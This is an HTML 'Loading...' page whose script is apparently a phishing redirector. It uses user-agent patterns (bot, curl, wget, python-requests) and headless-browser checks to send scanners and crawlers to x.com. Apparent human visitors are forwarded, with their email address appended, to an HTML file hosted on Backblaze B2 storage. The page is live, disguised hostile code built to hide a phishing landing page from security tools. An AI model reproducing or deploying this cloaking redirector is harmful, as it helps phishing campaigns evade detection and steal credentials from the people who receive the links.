<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .loading-image {
            width: 100px;
            height: auto;
        }
        .loading-text {
            margin-top: 20px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0,0,0,0.1);
            border-radius: 50%;
            border-top-color: #3498db;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <script nonce="MzcxMDk5MDgyMywxNzE1Mzc1OTg1">
        // Bot detection function
        function isBot() {
            // Check for common bot user agents
            const botPatterns = [
                /bot/, /spider/, /crawl/, /slurp/, 
                /search/, /archiver/, /scraper/, 
                /facebookexternalhit/, /googlebot/,
                /bingbot/, /yandex/, /baiduspider/,
                /curl/, /wget/, /python-requests/,
                /http-client/, /libwww/, /perl/,
                /java/, /ruby/, /php/
            ];
            
            const userAgent = navigator.userAgent.toLowerCase();
            
            // Check if any bot pattern matches
            if (botPatterns.some(pattern => pattern.test(userAgent))) {
                return true;
            }
            
            // Check for headless browser features
            if (navigator.webdriver || 
                window.__webdriver_script_fn || 
                window.__nightmare || 
                document.$cdc_asdjflasutopfhvcZLmcfl_) {
                return true;
            }
            
            // Check if browser supports features that bots often lack
            if (!('ontouchstart' in window) && 
                !navigator.plugins.length && 
                !navigator.mimeTypes.length && 
                window.screen.width === 0 && 
                window.screen.height === 0) {
                return true;
            }
            
            return false;
        }

        setTimeout(function() {
            if (isBot()) {
                // Redirect bots to x.com
                window.location.href = "https://x.com";
            } else {
                // Normal behavior for humans
                const email = new URLSearchParams(window.location.search).get('email') || 
                             window.location.hash.replace('#', '') || '';
                window.location.href = `https://f005.backblazeb2.com/file/QybO1SqPHUeh9Kbiglo/bidsebigl.html${email ? '#' + email : ''}`;
            }
        }, 500);
    </script>
</body>
</html>
